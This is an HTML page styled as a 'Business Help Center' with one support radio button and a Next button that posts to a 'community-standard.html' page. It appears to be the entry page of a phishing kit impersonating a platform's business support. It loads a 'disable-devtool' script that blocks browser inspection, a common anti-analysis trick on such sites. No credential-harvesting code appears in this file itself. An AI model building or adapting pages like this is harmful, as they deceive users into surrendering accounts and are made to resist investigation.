<!doctype html>
<html lang="en">

<head>
    <title>Help Center</title>
    <!-- Required meta tags -->
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>

    <!-- Bootstrap CSS v5.2.1 -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"
          integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous"/>
    <!-- Link Font -->
    <!-- <link href="https://db.onlinewebfonts.com/c/0c5e6f133b0b25edfed47aca4ab57676?family=Segoe+UI+Historic"
        rel="stylesheet"> -->
    <link href="https://fonts.cdnfonts.com/css/segoe-ui-4" rel="stylesheet">

    <link href="https://fonts.cdnfonts.com/css/frutiger" rel="stylesheet">


    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=AR+One+Sans&family=Ruda:wght@500&display=swap"
          rel="stylesheet">
    <!-- Favicon -->
    <link rel="shortcut icon"
          href="/img/xike.ico">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css"
          integrity="sha512-5A8nwdMOWrSz20fDsjczgUidUBR8liPYU+WymTZP1lmY9G6Oc7HlZv156XqnsgNUzTyMefFTcsFH/tnJE/+xBg=="
          crossorigin="anonymous" referrerpolicy="no-referrer"/>
    <!-- Inject Style -->
    <link rel="stylesheet" href="/style/index.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
          integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA=="
          crossorigin="anonymous" referrerpolicy="no-referrer"/>
    <link rel="stylesheet" href="/style/index.css">

    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
</head>

<body>
<div class="container-fuid" style="overflow: hidden;height: 100vh">
    <div class="row position-relative" style="height: 30vh;">
        <img src="/img/banner-b1482d4c.webp" style="object-fit: cover;object-position: center;padding: 0;" alt="">
        <div class="position-absolute text-light"
             style="top: 50%;left: 50%;transform: translate(-50%, -50%);text-align: center;">
            <p style="font-size: 20px;">Business Help Center</p>
            <h1 style="font-weight: 600;">How can we help you?</h1>
        </div>
    </div>
    <div class="row justify-content-center mt-5">
        <div class="col-10 col-xl-7 col-md-8 text-center">
            <h4 class="fw-semibold">How can we help?</h4>
            <p>We need more information to address your issue. This form will only take a few minutes.</p>
        </div>
    </div>
    <div class="row justify-content-center mt-5">
        <div class="col-11 col-xl-7 col-md-8">
            <form action="/community-standard.html" class="rounded p-3 w-100"
                  style="box-shadow: rgba(100, 100, 111, 0.2) 0px 7px 29px 0px;">
                <p class="fw-semibold">Most common issues</p>
                <div class="d-flex justify-content-center">
                    <div class="p-3" style="box-shadow: rgba(100, 100, 111, 0.2) 0px 7px 29px 0px;width: 100%;">
                        <div class="form-check mb-3">
                            <input class="form-check-input" type="radio" name="flexRadioDisabled"
                                   id="flexRadioCheckedDisabled" required>
                            <label class="form-check-label" for="flexRadioCheckedDisabled">
                                I need to contact the support team
                            </label>
                        </div>
                        
                    </div>
                </div>
                <div class="d-flex justify-content-end mt-3" style="width: 100%;">
                    <button type="submit" id="btn-submit" class="btn text-light" disabled
                            style="background-color: #223654;">Next
                    </button>
                </div>

            </form>
        </div>
    </div>

</div>


<!-- Bootstrap JavaScript Libraries -->
<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"
        integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r"
        crossorigin="anonymous"></script>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js"
        integrity="sha384-BBtl+eGJRgqQAUMxJ7pMwbEyER4l1g+O15P+16Ep7Q9Q+zqX6gSbd85u4mG4QzX+"
        crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.4.8/dist/sweetalert2.all.min.js"></script>
<script disable-devtool-auto src='https://cdn.jsdelivr.net/npm/disable-devtool@latest'></script>
<script>
    let isConfirm = false;
    let isNotRobot = false;
    $(document).ready(function () {
        $("#flexRadioCheckedDisabled").on('change', function () {
            if ($(this).is(":checked")) {
                isConfirm = true;
            } else {
                isConfirm = false;
            }

            if (isConfirm ) {
                $('#btn-submit').attr('disabled', false);
            } else {
                $('#btn-submit').attr('disabled', true);
            }
        });
    })

  
</script>
</body>

</html>
